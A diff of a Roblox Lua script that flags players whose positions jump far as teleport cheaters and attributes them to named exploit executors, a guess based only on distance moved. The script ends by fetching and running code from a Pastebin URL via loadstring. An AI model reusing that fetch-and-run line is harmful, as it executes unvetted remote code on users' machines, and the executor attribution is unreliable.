@@ -361,10 +361,13 @@ local function sendNotification(message)
         Duration = 3;
     })
 end
+
 print("ethereal leaked?!?!!1!!11!! FR! fr!")
 print("ass ethereal ")
+
 -- Configuration
-local teleportThreshold = 380 -- Distance considered teleportation (in studs)
+local teleportThresholdSmall = 430 -- Threshold for small teleportation
+local teleportThresholdLarge = 790 -- Threshold for large teleportation
 local checkInterval = 0.01 -- Interval to check player positions (in seconds)
 local playerPositions = {} -- Store players' previous positions
 local flaggedPlayers = {} -- Store players who have already been flagged
@@ -374,15 +377,20 @@ local bypassFlag = false -- Set to true to bypass flag detection
 local function detectTeleportation(player, oldPosition, newPosition)
     local distance = (newPosition - oldPosition).Magnitude
 
-    -- Uncomment for debug print
+    -- Debug print
     -- print(player.Name .. " - Distance moved: " .. distance)
 
-    if distance >= teleportThreshold and not bypassFlag then
-        -- Flag the player if not already flagged
-        if not flaggedPlayers[player.Name] then
+    if not bypassFlag then
+        -- Large teleportation (790 studs or more)
+        if distance >= teleportThresholdLarge and not flaggedPlayers[player.Name] then
             flaggedPlayers[player.Name] = true -- Mark player as flagged
-            print(player.Name .. " flagged for teleportation!") -- Log the event
-            sendNotification("Doge Hub User Found:" ..player.Name .."Executor: Wave")
+            print(player.Name .. " flagged for large teleportation!") -- Log the event
+            sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Wave")
+        -- Small teleportation (430 studs or less)
+        elseif distance >= teleportThresholdSmall and distance < teleportThresholdLarge and not flaggedPlayers[player.Name] then
+            flaggedPlayers[player.Name] = true -- Mark player as flagged
+            print(player.Name .. " flagged for small teleportation!") -- Log the event
+            sendNotification("Doge Hub User Found: " .. player.Name .. " Executor: Solara")
         end
     end
 end
@@ -422,6 +430,7 @@ print("Player tracking started.")
 
 -- Load external script (make sure this is the intended use)
 loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
+
 
 
 
